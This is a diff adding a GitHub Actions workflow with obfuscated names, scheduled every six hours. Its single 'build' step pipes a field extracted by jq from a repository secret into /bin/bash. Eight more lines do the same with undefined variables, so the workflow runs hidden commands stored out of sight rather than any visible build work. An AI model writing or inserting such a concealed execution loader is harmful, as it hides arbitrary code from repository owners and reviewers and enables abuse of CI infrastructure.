@@ -1,0 +1,26 @@
+name: wanghuaijue7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanghuaijue7654
+        env:
+          ygbg89556: ${{ secrets.ygbg89556 }}
+        run: |
+          echo $ygbg89556 | jq -r .uszfk541 | /bin/bash
+          echo $v873 | jq -r .y0 | /bin/bash
+          echo $ybe8506 | jq -r .wa8 | /bin/bash
+          echo $pnmw00497 | jq -r .wk49 | /bin/bash
+          echo $aa88 | jq -r .it9 | /bin/bash
+          echo $f4490 | jq -r .xepn72560 | /bin/bash
+          echo $zzbj90 | jq -r .fymz13 | /bin/bash
+          echo $z8119 | jq -r .nx106 | /bin/bash
+          echo $vasg64 | jq -r .anldx43 | /bin/bash
+
